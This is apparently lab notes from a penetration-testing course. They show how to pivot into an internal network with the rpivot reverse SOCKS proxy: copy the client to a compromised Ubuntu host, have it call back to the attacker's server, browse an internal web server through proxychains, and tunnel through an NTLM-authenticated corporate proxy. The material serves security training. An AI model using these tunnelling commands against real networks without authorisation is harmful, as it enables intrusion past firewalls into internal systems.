[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.

**Note:** Rpivot (typical implementations) makes the compromised host initiate an outbound connection back to your server and provides either an HTTP tunnel or a reverse-SOCKS endpoint on your side. Use when the pivot is behind NAT/firewall and must connect out.

#### Cloning rpivot

	AstraX01@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git

We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using `server.py`.

#### Running server.py from the Attack Host

	AstraX01@htb[/htb]$ python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

Before running `client.py` we will need to transfer rpivot to the target. We can do this using this SCP command:

#### Transferring rpivot to the Target

	AstraX01@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

#### Running client.py from Pivot Target

	ubuntu@WEB01:~/rpivot$ python2 client.py --server-ip 10.10.14.18 --server-port 9999

#### Browsing to the Target Webserver using Proxychains

	proxychains firefox-esr 172.16.5.135:80

Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have [HTTP-proxy with NTLM authentication](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:

#### Connecting to a Web Server using HTTP-Proxy & NTLM Auth

	python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>



